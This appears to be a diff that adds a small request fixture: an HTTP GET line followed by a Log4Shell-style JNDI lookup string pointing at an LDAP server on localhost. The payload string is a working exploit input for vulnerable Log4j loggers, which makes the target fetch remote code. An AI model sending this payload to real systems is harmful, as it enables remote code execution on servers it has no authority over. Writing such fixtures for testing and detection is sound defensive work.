@@ -1,0 +1,2 @@
+GET / HTTP/1.1 Host: x
+${jndi:ldap://127.0.0.1:1389/a}
